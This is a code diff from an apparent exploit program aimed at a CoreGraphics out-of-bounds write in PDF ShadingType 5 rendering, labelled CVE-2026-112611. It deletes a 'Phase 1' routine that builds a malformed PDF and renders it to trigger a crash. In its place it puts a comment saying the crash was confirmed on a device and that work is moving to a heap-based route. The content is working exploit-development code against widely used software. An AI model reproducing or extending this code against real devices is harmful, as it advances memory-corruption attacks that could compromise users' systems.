@@ -30978,64 +30978,9 @@ static CFDataRef pdf_build_shading_pdf(int vpr, int rows, int nout, int target_i
 static void r508_exploit(void) {
     rlog("=== CVE-2026-112611: CoreGraphics ShadingType 5 OOB Write ===\n\n");
 
-    /* ---- Phase 1: Stack-route crash test (VPR=2, R=136) ---- */
-    rlog("--- Phase 1: Stack-route crash test (VPR=2, R=136) ---\n");
-    rlog("  Building malformed PDF: ShadingType 5, DeviceGray, 136 Function outputs...\n");
-    fflush(stdout);
-
-    CFDataRef pdf1_data = pdf_build_shading_pdf(2, 2, 136, -1, 0);
-    rlog("  PDF size: %ld bytes\n", (long)CFDataGetLength(pdf1_data));
-
-    CGDataProviderRef dp1 = CGDataProviderCreateWithCFData(pdf1_data);
-    CGPDFDocumentRef doc1 = CGPDFDocumentCreateWithProvider(dp1);
-    rlog("  CGPDFDocument: %p\n", (void *)doc1);
-
-    if (doc1) {
-        size_t npages = CGPDFDocumentGetNumberOfPages(doc1);
-        rlog("  Pages: %zu\n", npages);
-
-        if (npages > 0) {
-            CGPDFPageRef page = CGPDFDocumentGetPage(doc1, 1);
-            rlog("  Page 1: %p\n", (void *)page);
-
-            if (page) {
-                CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
-                uint32_t *pixels = (uint32_t *)calloc(256 * 256, 4);
-                CGContextRef ctx = CGBitmapContextCreate(pixels, 256, 256, 8, 256 * 4, cs,
-                    (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
-
-                rlog("  Rendering page (this triggers _cg_shading_type5_draw)...\n");
-                rlog("  >>> If app crashes here: VULNERABILITY CONFIRMED <<<\n");
-                fflush(stdout);
-
-                CGContextDrawPDFPage(ctx, page);
-
-                rlog("  SURVIVED Phase 1 render!\n");
-
-                /* Scan rendered pixels for anomalies */
-                int nonzero = 0;
-                uint32_t first_nz = 0;
-                for (int i = 0; i < 256 * 256; i++) {
-                    if (pixels[i] != 0) {
-                        if (nonzero == 0) first_nz = pixels[i];
-                        nonzero++;
-                    }
-                }
-                rlog("  Pixels: %d non-zero out of %d (first=0x%08x)\n",
-                     nonzero, 256 * 256, first_nz);
-
-                CGContextRelease(ctx);
-                CGColorSpaceRelease(cs);
-                free(pixels);
-            }
-        }
-        CGPDFDocumentRelease(doc1);
-    } else {
-        rlog("  FAILED to create PDF document from in-memory data\n");
-    }
-    CGDataProviderRelease(dp1);
-    CFRelease(pdf1_data);
-    rlog("  Phase 1 complete\n\n");
+    /* Phase 1 SKIPPED — stack-route (VPR=2, R=136) crashes with SIGSEGV.
+       Vulnerability confirmed on device. Moving to heap route. */
+    rlog("--- Phase 1: SKIPPED (confirmed SIGSEGV on prior run) ---\n\n");
     fflush(stdout);
 
     /* ---- Phase 2: Heap-route test (VPR=130, R=2000) ---- */
